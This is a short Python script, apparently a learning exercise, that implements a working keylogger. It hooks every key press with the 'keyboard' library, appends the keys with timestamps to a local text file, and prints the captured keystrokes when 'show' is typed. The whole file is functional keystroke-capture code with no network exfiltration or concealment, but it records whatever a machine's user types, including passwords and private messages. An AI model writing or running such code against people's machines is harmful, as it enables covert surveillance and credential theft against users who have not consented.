import keyboard                      #Import a library that records keyboard keystrokes.
from datetime import datetime            #Import a library that records date and time.


dicti = {}                                          #A dictionary for saving input from the keyboard.
str_for_show = ''
filename = r"C:\Git\myTestRepo1\kodcod1\file_for_kelogger.txt"


def on_key_press(key):                             #A function that receives input from another function (which records the keyboard), and inserts it into a dictionary entry whose key is the current date and time.
    global str_for_show,dicti,filename
    key = key.name
    currentTime = datetime.now().strftime('%d/%m/%y %H:%M')

    if currentTime not in dicti:
        dicti[currentTime] = ''
        fili = open(filename, "a")
        fili.write(f"**** {currentTime} ****\n")
        fili.close()

    fili = open(filename, "a")
    fili.write(key)
    fili.close()
    dicti[currentTime] += key
    str_for_show += key


    if "show" in str_for_show.lower():
        for k,v in dicti.items():                     #A loop that checks if the sequence of words "show" exists.
            print()
            print("****",k,"****")                  #If this sequence exists, then the software will print everything that has been saved so far, and empty the dictionary.
            print(v)
        dicti = {}
        str_for_show = ''


#For checking the current file.
if __name__ == "__main__":
    fili = open(filename, "w")
    fili.write("")
    fili.close()
    keyboard.on_press(on_key_press)               #function call.
    keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.